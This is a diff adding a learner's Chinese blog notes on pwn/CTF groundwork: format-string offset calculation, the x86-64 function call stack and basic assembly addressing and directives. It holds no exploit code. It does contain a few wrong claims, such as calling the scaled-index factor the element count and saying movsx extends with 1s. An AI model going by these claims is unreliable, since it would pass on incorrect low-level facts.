+<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>
+<h3 id="2）64位偏移计算原理">2）64位偏移计算原理<a class="post-anchor" href="#2）64位偏移计算原理"></a></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>
+<h3 id="3）-pwntools-fmtstr工具">3） pwntools_fmtstr工具<a class="post-anchor" href="#3）-pwntools-fmtstr工具"></a></h3><p>​    tbc。。。</p>
+<h3 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h3><p>​    <a href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
 </body></html>]]></content>
   </entry>
   <entry>
@@ -1843,5 +1865,76 @@ show<span class="token punctuation">(</span><span class="token number">0</span><
 <p>​    这样看其实看不出什么端倪，具体功能的实现还是要看脚本的内容，但是估计我也看不懂（）。</p>
 <p>​    </p>
 </body></html>]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2021/10/12/%E6%91%86%E7%83%82%E7%AC%AC%E4%B8%80%E5%A4%A9--%E5%86%8D%E6%8E%A2%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
+    <content><![CDATA[<html><head></head><body><pre><code>   ***开摆第一天***
+</code></pre>
+<h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>stack_pro力求从最底层的角度深究每一道简单的栈溢出题背后的原理。而第一章则从栈溢出的理论基础–函数调用栈开始。</p>
+<h3 id="2）函数调用栈">2）函数调用栈<a class="post-anchor" href="#2）函数调用栈"></a></h3><p>从一个简单的程序入手。</p>
+<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" data-caption="image-20211012194601557" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" alt="image-20211012194601557"></a></p>
+<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>
+<pre><code class="asm">push    rbp
+mov     rbp, rsp
+sub     rsp, 30h
+</code></pre>
+<p>然后就是人神共愤的函数调用栈环节。</p>
+<blockquote>
+<p>rbp ： 栈基址指针寄存器 。</p>
+<p>rsp ： 栈顶指针寄存器。</p>
+</blockquote>
+<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>
+<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>
+<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" data-caption="截屏2021-10-12 下午11.11.18" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" alt="截屏2021-10-12 下午11.11.18"></a></p>
+<p>​     ebp也就是s的位置，很显然在esp之下。</p>
+<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>
+<blockquote>
+<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
+</blockquote>
+<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" data-caption="截屏2021-10-13 下午8.01.32" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" alt="截屏2021-10-13 下午8.01.32"></a></p>
+<blockquote>
+<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>
+</blockquote>
+<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>
+<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" data-caption="截屏2021-10-13 下午5.14.08" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" alt="截屏2021-10-13 下午5.14.08"></a></p>
+<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>
+<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>
+<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>
+</body></html>]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2021/10/13/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%8C%E5%A4%A9--%E5%86%8D%E6%8E%A2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
+    <content><![CDATA[<html><head></head><body><h3 id="1）寻址">1）寻址<a class="post-anchor" href="#1）寻址"></a></h3><h5 id="1-直接寻址">1/直接寻址<a class="post-anchor" href="#1-直接寻址"></a></h5><pre><code class="asm">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。
+</code></pre>
+<h5 id="2-间接寻址">2/间接寻址<a class="post-anchor" href="#2-间接寻址"></a></h5><p>间接在使用指针以及解引用的形式</p>
+<pre><code class="asm">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。
+</code></pre>
+<h5 id="3-比例寻址">3/比例寻址<a class="post-anchor" href="#3-比例寻址"></a></h5><p>例如在数组遍历中</p>
+<pre><code class="asm">.data
+arrayD 1,2,3,4
+.code
+mov esi,3
+mov eax,arrayD[esi*4]                    ;eax = 4
+</code></pre>
+<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>
+<h2 id="2）段寄存器">2）段寄存器<a class="post-anchor" href="#2）段寄存器"></a></h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>
+<h2 id="3）基础指令">3）基础指令<a class="post-anchor" href="#3）基础指令"></a></h2><h3 id="1-数据传输">1/数据传输<a class="post-anchor" href="#1-数据传输"></a></h3><h4 id="mov">mov<a class="post-anchor" href="#mov"></a></h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>
+<h5 id="movzx">movzx<a class="post-anchor" href="#movzx"></a></h5><p>对目的操作数进行全0拓展并且复制。</p>
+<h5 id="movsx">movsx<a class="post-anchor" href="#movsx"></a></h5><p>同上，但是是用1拓展而不是0。</p>
+<p>与数据传输相关的指令还有很多，以后待补充。</p>
+<h3 id="2-与数据相关的运算符和伪指令">2/与数据相关的运算符和伪指令<a class="post-anchor" href="#2-与数据相关的运算符和伪指令"></a></h3><h4 id="offset">offset<a class="post-anchor" href="#offset"></a></h4><p>返回一个偏移量</p>
+<h4 id="align">align<a class="post-anchor" href="#align"></a></h4><p>将一个变量对齐到边界。</p>
+<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>
+<h4 id="ptr">ptr<a class="post-anchor" href="#ptr"></a></h4><p>重写一个已经被声明过操作数的大小类型。</p>
+<h4 id="type">type<a class="post-anchor" href="#type"></a></h4><p>返回变量单个元素的大小</p>
+<h4 id="lengthof">lengthof<a class="post-anchor" href="#lengthof"></a></h4><p>计算数组中元素的个数</p>
+<h4 id="sizeof">sizeof<a class="post-anchor" href="#sizeof"></a></h4><p>返回lengthof和type的乘积</p>
+<h3 id=""><a class="post-anchor" href="#"></a></h3></body></html>]]></content>
   </entry>
 </search>
